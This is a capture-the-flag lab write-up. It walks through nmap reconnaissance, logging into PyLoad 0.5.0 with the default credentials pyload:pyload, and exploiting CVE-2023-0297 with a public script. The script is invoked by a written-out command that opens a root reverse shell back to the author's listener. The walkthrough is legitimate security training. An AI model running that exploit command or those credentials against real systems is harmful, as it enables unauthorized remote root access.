CTF-200-05

Target IP: 192.168.250.26
Challenge Description: N/A.

Reconnaissance


This machine was incredibly slow to scan. Even performing a port scan using different flags was slow. However, I was able to speed up the port scan using the command sudo nmap -sS 192.168.250.26 --top-ports=1000. According to the scan, there are two TCP ports open on 22 and 9666 as shown above.


Performing an aggressive port scan against the two open TCP ports returns the result above. The Python application on port 9666 looks interesting and I will start enumeration there.

Enumeration

Port 9666: CherryPy

The webpage above is shown for this web application. Right away, it provides the application name PyLoad as shown above.


Doing a Google search for default credentials of this application shows it is pyload:pyload. After using the default credentials pyload:pyload, I gained access to the web application shown above. I did some enumeration but I did not find anything useful on this application. Pressing the Info button shows the configuration & version. It looks like the target machine is running the application PyLoad 0.5.0 on this port as shown above.


And PyLoad 0.5.0 is vulnerable to code injection, as shown above. It has the CVE id of CVE-2023-0297. This has a critical severity.


After searching for CVE-2023-0297 exploits, I came across the public exploit above. This exploit is perfect as the target machine is running PyLoad 0.5.0. I downloaded this exploit on my machine.

Exploitation & Flag


This exploit is great as it supports automatic reverse shell connection by the use of flag -I. I started a listener on my machine at port 8443. Using the command python3 exp.py -t http://192.168.250.26:9666 -I 192.168.45.176 -P 8443, I deployed the exploit against the target machine. And bingo! I obtained a reverse shell connection on my machine at port 8443 with the session as root. No need to perform privilege escalation :)


There is only one flag on this machine as the exploit lands a root shell. The proof.txt flag is shown above.
